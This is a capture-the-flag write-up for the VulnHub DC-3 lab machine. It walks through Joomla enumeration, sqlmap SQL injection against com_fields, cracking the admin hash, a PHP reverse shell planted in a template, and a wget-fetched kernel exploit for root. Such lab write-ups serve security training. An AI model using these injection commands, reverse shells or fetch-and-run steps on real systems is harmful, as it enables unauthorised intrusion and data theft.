# DC-3 — VulnHub Writeup

**Platform:** VulnHub  
**Difficulty:** Easy-Medium  
**Goal:** Gain root — only 1 flag (root flag)  
**Techniques:** Joomla enumeration, Joomscan, SQLi via Joomla exploit, admin panel reverse shell, kernel exploit CVE-2016-4557

---

## Table of Contents

1. [Setup & Reconnaissance](#1-setup--reconnaissance)
2. [Port Scanning](#2-port-scanning)
3. [Web Enumeration](#3-web-enumeration)
4. [Joomla Version & Vulnerability Discovery](#4-joomla-version--vulnerability-discovery)
5. [Exploiting Joomla — Getting Admin Access](#5-exploiting-joomla--getting-admin-access)
6. [Reverse Shell via Admin Panel](#6-reverse-shell-via-admin-panel)
7. [Privilege Escalation — Kernel Exploit CVE-2016-4557](#7-privilege-escalation--kernel-exploit-cve-2016-4557)
8. [Root Flag](#8-root-flag)
9. [Key Takeaways](#9-key-takeaways)

---

## 1. Setup & Reconnaissance

DC-3 runs a Joomla CMS. Unlike DC-2, no `/etc/hosts` entry is needed — the site is accessed directly via IP address throughout.

Find the target IP using netdiscover:

```bash
sudo netdiscover
```

---

## 2. Port Scanning

```bash
nmap -sV -sC -p- 192.168.x.x
```

**Results:**

| Port | Service | Details |
|------|---------|---------|
| 80   | HTTP    | Apache — Joomla CMS |

Only port 80 open. Attack surface is entirely web-based.

---

## 3. Web Enumeration

Browsing to `http://dc-3` reveals a Joomla site. Standard Gobuster/Nikto scans confirm it's Joomla and reveal the admin panel at:

```
http://dc-3/administrator
```

```bash
gobuster dir -u http://dc-3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## 4. Joomla Version & Vulnerability Discovery

Use **Joomscan** to fingerprint the Joomla version and find vulnerabilities:

```bash
joomscan -u http://dc-3
```

**Key output:**
- Joomla version: `3.7.0`
- Known vulnerability: SQL Injection in `com_fields` component

Search for a matching exploit:

```bash
searchsploit joomla 3.7.0
```

**Result:** `Joomla! 3.7.0 - SQL Injection` — `php/webapps/42033.txt`

Read the exploit details:

```bash
searchsploit -x php/webapps/42033.txt
```

---

## 5. Exploiting Joomla — Getting Admin Access

The exploit uses `sqlmap` against the vulnerable `com_fields` parameter:

```bash
sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

**Databases found:** `joomladb`, `information_schema`, `mysql`

Dump the `joomladb` users table:

```bash
sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

```bash
sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent -D joomladb -T '#__users' --dump -p list[fullordering]
```

**Credentials retrieved:**
- Username: `admin`
- Password hash: `$2y$10$...` (bcrypt)

Crack the hash with **John the Ripper**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password:** `snoopy`

---

## 6. Reverse Shell via Admin Panel

Log into the Joomla admin panel at `http://dc-3/administrator` with `admin:snoopy`.

Navigate to:
```
Extensions → Templates → Templates → Beez3 → index.php
```

Replace the template content with a PHP reverse shell (from `/usr/share/webshells/php/php-reverse-shell.php`). Update your IP and port:

```php
$ip = '192.168.x.x';  // your Kali IP
$port = 8080;
```

Start a listener on Kali:

```bash
nc -lvnp 8080
```

Trigger the shell by visiting:

```
http://dc-3/templates/beez3/index.php
```

**Shell received as `www-data`.**

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 7. Privilege Escalation — Kernel Exploit CVE-2016-4557

Check the kernel version:

```bash
uname -a
```

**Output:** Linux kernel `4.4.0-21-generic` (Ubuntu 16.04)

This version is vulnerable to **CVE-2016-4557** — a use-after-free vulnerability in the BPF subsystem that allows local privilege escalation.

Search for the exploit:

```bash
searchsploit linux kernel 4.4.0 ubuntu
```

Find and copy the exploit:

```bash
searchsploit -m 39772
```

The exploit requires compilation. Transfer it to the target:

```bash
# On Kali — start a simple HTTP server
python3 -m http.server 8080

# On target
cd /tmp
wget http://192.168.x.x:8080/39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

**Root shell obtained.**

---

## 8. Root Flag

```bash
cd /root
cat the-flag.txt
```

**Machine complete.**

---

## 9. Key Takeaways

- **Joomscan over WPScan for Joomla** — always use the right tool for the CMS. Joomscan fingerprints version and known CVEs in one shot.
- **SQLi via sqlmap** — the `com_fields` vulnerability in Joomla 3.7.0 is a well-known critical flaw. Knowing how to feed the right parameter to sqlmap is the key skill here.
- **Admin panel = game over** — once you have CMS admin credentials, template/plugin editors are almost always a direct path to RCE.
- **Kernel version is always worth checking** — `uname -a` should be one of your first commands on any shell. Old kernels on CTF machines are very often exploitable.
- **CVE-2016-4557** — a local privilege escalation in Linux kernel ≤ 4.4.0-21 via the BPF `doubleput` vulnerability. Worth knowing by name for interviews.

---

*Machine completed by Shahid | [GitHub](https://github.com/Shahid-git-09/vulnhub-writeups)*
